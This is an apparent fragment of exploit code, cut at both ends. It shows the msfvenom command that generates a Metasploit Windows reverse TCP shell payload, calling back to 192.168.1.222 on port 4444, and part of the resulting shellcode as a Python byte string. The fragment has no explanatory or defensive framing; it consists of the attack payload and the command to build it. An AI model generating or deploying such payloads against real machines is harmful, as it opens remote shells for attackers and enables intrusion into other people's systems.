...
# Metasploit payload windows/shell/reverse_tcp
# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.222 LPORT=4444 -f c 
shellcode = (
    ...
    "\x29\x80\x6b\x00\xff\xd5\x6a\x05\x68\xc0\xa8\x01\xde\x68\x02"
